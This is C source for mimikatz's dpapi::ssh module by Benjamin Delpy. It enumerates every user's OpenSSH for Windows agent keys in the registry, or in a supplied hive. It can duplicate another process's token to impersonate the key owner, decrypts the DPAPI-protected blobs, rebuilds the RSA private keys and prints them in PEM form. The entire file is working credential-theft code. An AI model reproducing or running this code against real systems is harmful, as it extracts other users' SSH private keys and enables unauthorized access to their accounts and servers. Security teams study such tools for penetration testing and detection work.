/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
#include "kuhl_m_dpapi_ssh.h"

NTSTATUS kuhl_m_dpapi_ssh(int argc, wchar_t * argv[])
{
	PKULL_M_REGISTRY_HANDLE hRegistry;
	LPCWSTR szHive;
	HANDLE hHive;
	HKEY hBase, hUser;
	DWORD i, nbSubKeys, szMaxSubKeyLen, szKey;
	wchar_t * keyName;

	if(kull_m_string_args_byName(argc, argv, L"hive", &szHive, NULL))
	{
		hHive = CreateFile(szHive, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
		if(hHive != INVALID_HANDLE_VALUE)
		{
			if(kull_m_registry_open(KULL_M_REGISTRY_TYPE_HIVE, hHive, FALSE, &hRegistry))
			{
				kuhl_m_dpapi_ssh_keys4user(hRegistry, NULL, NULL, argc, argv);
				kull_m_registry_close(hRegistry);
			}
			CloseHandle(hHive);
		}
		else PRINT_ERROR_AUTO(L"CreateFile");
	}
	else
	{
		if(kull_m_registry_open(KULL_M_REGISTRY_TYPE_OWN, NULL, FALSE, &hRegistry))
		{
			if(kull_m_registry_RegOpenKeyEx(hRegistry, HKEY_USERS, NULL, 0, KEY_ENUMERATE_SUB_KEYS, &hBase))
			{
				if(kull_m_registry_RegQueryInfoKey(hRegistry, hBase, NULL, NULL, NULL, &nbSubKeys, &szMaxSubKeyLen, NULL, NULL, NULL, NULL, NULL, NULL))
				{
					szMaxSubKeyLen++;
					if(keyName = (wchar_t *) LocalAlloc(LPTR, (szMaxSubKeyLen + 1) * sizeof(wchar_t)))
					{
						for(i = 0; i < nbSubKeys; i++)
						{
							szKey = szMaxSubKeyLen;
							if(kull_m_registry_RegEnumKeyEx(hRegistry, hBase, i, keyName, &szKey, NULL, NULL, NULL, NULL))
							{
								if(!wcsstr(keyName, L"_Classes"))
								{
									kprintf(L"%s ", keyName);
									if(kull_m_registry_RegOpenKeyEx(hRegistry, hBase, keyName, 0, KEY_READ, &hUser))
									{
										kprintf(L"\n");
										kuhl_m_dpapi_ssh_keys4user(hRegistry, hUser, keyName, argc, argv);
										kull_m_registry_RegCloseKey(hRegistry, hUser);
									}
									else PRINT_ERROR_AUTO(L"kull_m_registry_RegOpenKeyEx");
								}
							}
						}
						LocalFree(keyName);
					}
				}
				kull_m_registry_RegCloseKey(hRegistry, hBase);
			}
			else PRINT_ERROR_AUTO(L"kull_m_registry_RegOpenKeyEx");
			kull_m_registry_close(hRegistry);
		}
	}
	return STATUS_SUCCESS;
}

void kuhl_m_dpapi_ssh_keys4user(PKULL_M_REGISTRY_HANDLE hRegistry, HKEY hUser, LPCWSTR szSID, int argc, wchar_t * argv[])
{
	HKEY hKeys, hEntry;
	DWORD i, nbSubKeys, szMaxSubKeyLen, szKey;
	wchar_t * keyName;
	KUHL_M_DPAPI_SSH_TOKEN tokenData = {NULL, NULL};
	BOOL tokenToClose = FALSE;

	if(kull_m_registry_RegOpenKeyEx(hRegistry, hUser, L"Software\\OpenSSH\\Agent\\Keys", 0, KEY_WOW64_64KEY | KEY_READ, &hKeys))
	{
		if(szSID && kull_m_string_args_byName(argc, argv, L"impersonate", NULL, NULL))
		{
			kprintf(L" * Trying to get an impersonation token for %s: ", szSID);
			if(ConvertStringSidToSid(szSID, &tokenData.pSid))
			{
				if(tokenToClose = kull_m_token_getTokensUnique(kuhl_m_dpapi_ssh_impersonate, &tokenData))
				{
					kprintf(L"   ");
					kuhl_m_token_displayAccount(tokenData.hToken, FALSE);
				}
				else PRINT_ERROR_AUTO(L"kull_m_token_getTokensUnique/kull_m_token_getTokensUnique");
			}
			else PRINT_ERROR_AUTO(L"ConvertStringSidToSid");
		}

		if(kull_m_registry_RegQueryInfoKey(hRegistry, hKeys, NULL, NULL, NULL, &nbSubKeys, &szMaxSubKeyLen, NULL, NULL, NULL, NULL, NULL, NULL))
		{
			szMaxSubKeyLen++;
			if(keyName = (wchar_t *) LocalAlloc(LPTR, (szMaxSubKeyLen + 1) * sizeof(wchar_t)))
			{
				for(i = 0; i < nbSubKeys; i++)
				{
					szKey = szMaxSubKeyLen;
					if(kull_m_registry_RegEnumKeyEx(hRegistry, hKeys, i, keyName, &szKey, NULL, NULL, NULL, NULL))
					{
						kprintf(L"\n   [%s] ", keyName);
						if(kull_m_registry_RegOpenKeyEx(hRegistry, hKeys, keyName, 0, KEY_READ, &hEntry))
						{
							kprintf(L"\n");
							kuhl_m_dpapi_ssh_getKey(hRegistry, hEntry,  argc, argv, tokenData.hToken);
							kull_m_registry_RegCloseKey(hRegistry, hEntry);
						}
						else PRINT_ERROR_AUTO(L"kull_m_registry_RegOpenKeyEx");
					}
				}
				LocalFree(keyName);
			}
		}
		else PRINT_ERROR_AUTO(L"kull_m_registry_RegQueryInfoKey");

		if(tokenData.pSid)
			LocalFree(tokenData.pSid);
		if(tokenToClose && tokenData.hToken)
			CloseHandle(tokenData.hToken);
		kull_m_registry_RegCloseKey(hRegistry, hKeys);
	}
}

BOOL CALLBACK kuhl_m_dpapi_ssh_impersonate(HANDLE hToken, DWORD ptid, PVOID pvArg)
{
	TOKEN_STATISTICS tokenStats;
	DWORD szNeeded;
	BOOL isUserOK = TRUE;
	PKUHL_M_DPAPI_SSH_TOKEN pData = (PKUHL_M_DPAPI_SSH_TOKEN) pvArg;
	TOKEN_TYPE ttTarget = TokenImpersonation;
	SECURITY_IMPERSONATION_LEVEL ilTarget;
	if(ptid != GetCurrentProcessId())
	{
		if(GetTokenInformation(hToken, TokenStatistics, &tokenStats, sizeof(TOKEN_STATISTICS), &szNeeded))
		{
			isUserOK = FALSE;
			kull_m_token_CheckTokenMembership(hToken, pData->pSid, &isUserOK);
			if(isUserOK)
			{
				ilTarget = (tokenStats.TokenType == TokenPrimary) ? SecurityDelegation : tokenStats.ImpersonationLevel;
				isUserOK = !DuplicateTokenEx(hToken, TOKEN_QUERY | TOKEN_IMPERSONATE, NULL, ilTarget, ttTarget, &pData->hToken);
			}
			else isUserOK = TRUE;
		}
	}
	return isUserOK;
}

void kuhl_m_dpapi_ssh_getKey(PKULL_M_REGISTRY_HANDLE hRegistry, HKEY hEntry, int argc, wchar_t * argv[], HANDLE hToken)
{
	PVOID data, dataOut;
	DWORD szData, cbDataOut, type;
	BOOL toReverse = FALSE;

	if(kull_m_registry_QueryWithAlloc(hRegistry, hEntry, L"comment", NULL, &data, &szData))
	{
		kprintf(L"     comment: %.*S\n", szData, data);
		LocalFree(data);
	}
	if(kull_m_registry_QueryWithAlloc(hRegistry, hEntry, L"type", &type, &data, &szData))
	{
		if(type == REG_DWORD)
		{
			type = *(PDWORD) data;
			kprintf(L"     type   : %u\n", type);
		}
		else PRINT_ERROR(L"Incompatible REG type: %u\n", type);
		LocalFree(data);
	}
	if(type == KEY_RSA)
	{
		if(kull_m_registry_QueryWithAlloc(hRegistry, hEntry, NULL, NULL, &data, &szData))
		{
			if(hToken)
				toReverse = SetThreadToken(NULL, hToken);
			if(kuhl_m_dpapi_unprotect_raw_or_blob(data, szData, NULL, argc, argv, NULL, 0, &dataOut, &cbDataOut, NULL))
			{
				kuhl_m_dpapi_ssh_getRSAfromRAW((LPCBYTE) dataOut, cbDataOut);
				LocalFree(dataOut);
			}
			if(toReverse)
				SetThreadToken(NULL, NULL);
			LocalFree(data);
		}
	}
	else PRINT_ERROR(L"Not a RSA key!\n");
}

BOOL kuhl_m_dpapi_ssh_getRSAfromRAW(LPCBYTE data, DWORD szData)
{
	BOOL status = FALSE;
	PBYTE pData = (PBYTE) data, pModulus, pPublicExp, pPrime1, pPrime2;
	BCRYPT_RSAKEY_BLOB StaticRsaBlob = {BCRYPT_RSAPRIVATE_MAGIC, 1024 /* ? */, 0, 0, 0, 0}, *pBasicRsaBlob, *pFullRsaBlob;
	DWORD szNeeded;
	NTSTATUS ntStatus;
	BCRYPT_ALG_HANDLE hAlg;
	BCRYPT_KEY_HANDLE hKey;
	DATA_BLOB Asn1Blob;
	LPWSTR b64Out;

	kuhl_m_dpapi_ssh_ParseKeyElement(&pData, NULL, NULL); // avoid RSA header
	kuhl_m_dpapi_ssh_ParseKeyElement(&pData, &pModulus, &StaticRsaBlob.cbModulus); // n - modulus
	kuhl_m_dpapi_ssh_ParseKeyElement(&pData, &pPublicExp, &StaticRsaBlob.cbPublicExp); // e - public exp
	kuhl_m_dpapi_ssh_ParseKeyElement(&pData, NULL, NULL); // avoid d - private exponent
	kuhl_m_dpapi_ssh_ParseKeyElement(&pData, NULL, NULL); // avoid iqmp - coefficient
	kuhl_m_dpapi_ssh_ParseKeyElement(&pData, &pPrime1, &StaticRsaBlob.cbPrime1); // p - prime 1
	kuhl_m_dpapi_ssh_ParseKeyElement(&pData, &pPrime2, &StaticRsaBlob.cbPrime2); // q - prime 2
	szNeeded = sizeof(BCRYPT_RSAKEY_BLOB) + StaticRsaBlob.cbPublicExp + StaticRsaBlob.cbModulus + StaticRsaBlob.cbPrime1 + StaticRsaBlob.cbPrime2;
	if(pBasicRsaBlob = (BCRYPT_RSAKEY_BLOB *) LocalAlloc(LPTR, szNeeded))
	{
		pData = (PBYTE) pBasicRsaBlob;
		RtlCopyMemory(pData, &StaticRsaBlob, sizeof(BCRYPT_RSAKEY_BLOB));
		pData += sizeof(BCRYPT_RSAKEY_BLOB);
		RtlCopyMemory(pData, pPublicExp, StaticRsaBlob.cbPublicExp);
		pData += StaticRsaBlob.cbPublicExp;
		RtlCopyMemory(pData, pModulus, StaticRsaBlob.cbModulus);
		pData += StaticRsaBlob.cbModulus;
		RtlCopyMemory(pData, pPrime1, StaticRsaBlob.cbPrime1);
		pData += StaticRsaBlob.cbPrime1;
		RtlCopyMemory(pData, pPrime2, StaticRsaBlob.cbPrime2);

		__try
		{
			ntStatus = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_RSA_ALGORITHM, MS_PRIMITIVE_PROVIDER, 0);
			if(NT_SUCCESS(ntStatus))
			{
				ntStatus = BCryptImportKeyPair(hAlg, NULL, BCRYPT_RSAPRIVATE_BLOB, &hKey, (PUCHAR) pBasicRsaBlob, szNeeded, 0);
				if(NT_SUCCESS(ntStatus))
				{
					ntStatus = BCryptExportKey(hKey, NULL, BCRYPT_RSAFULLPRIVATE_BLOB, NULL, 0, &szNeeded, 0);
					if(NT_SUCCESS(ntStatus))
					{
						if(pFullRsaBlob = (BCRYPT_RSAKEY_BLOB *) LocalAlloc(LPTR, szNeeded))
						{
							ntStatus = BCryptExportKey(hKey, NULL, BCRYPT_RSAFULLPRIVATE_BLOB, (PUCHAR) pFullRsaBlob, szNeeded, &szNeeded, 0);
							if(NT_SUCCESS(ntStatus))
							{
								if(kuhl_m_crypto_c_sc_auth_quickEncode(CNG_RSA_PRIVATE_KEY_BLOB, pFullRsaBlob, &Asn1Blob)) // yeah, it needs BCRYPT_RSAFULLPRIVATE_BLOB
								{
									if(status = kuhl_m_dpapi_ssh_EncodeB64_headers(L"RSA PRIVATE KEY", &Asn1Blob, &b64Out))
									{
										kprintf(b64Out);
										LocalFree(b64Out);
									}
									else PRINT_ERROR_AUTO(L"EncodeB64_headers");
									LocalFree(Asn1Blob.pbData);
								}
							}
							else PRINT_ERROR(L"BCryptExportKey(data): 0x%08x\n", ntStatus);
							LocalFree(pFullRsaBlob);
						}
					}
					else PRINT_ERROR(L"BCryptExportKey(init): 0x%08x\n", ntStatus);
					BCryptDestroyKey(hKey);
				}
				else PRINT_ERROR(L"BCryptImportKeyPair: 0x%08x\n", ntStatus);
				BCryptCloseAlgorithmProvider(hAlg, 0);
			}
		}
		__except(GetExceptionCode() == ERROR_DLL_NOT_FOUND)
		{
			PRINT_ERROR(L"No CNG when dealing with OpenSSH for Windows 10?\n");
		}
		LocalFree(pBasicRsaBlob);
	}
	return status;
}

void kuhl_m_dpapi_ssh_ParseKeyElement(PBYTE *pRaw, PBYTE *pData, DWORD *pszData)
{
	DWORD szCur = _byteswap_ulong(*(PDWORD) *pRaw);
	if(pszData)
		*pszData = szCur;
	*pRaw += sizeof(DWORD);
	if(pData)
		*pData = *pRaw;
	*pRaw += szCur;
}

BOOL kuhl_m_dpapi_ssh_EncodeB64_headers(LPCWSTR type, DATA_BLOB *data, LPWSTR *out)
{
	BOOL status = FALSE;
	DWORD dwBytesWritten = 0;
	LPWSTR base64;
	if(CryptBinaryToString(data->pbData, data->cbData, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCR, NULL, &dwBytesWritten))
	{
		if(base64 = (LPWSTR) LocalAlloc(LPTR, dwBytesWritten * sizeof(wchar_t)))
		{
			if(CryptBinaryToString(data->pbData, data->cbData, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCR, base64, &dwBytesWritten))
				status = kull_m_string_sprintf(out, L"-----BEGIN %s-----\n%s-----END %s-----\n", type, base64, type);
			LocalFree(base64);
		}
	}
	return status;
}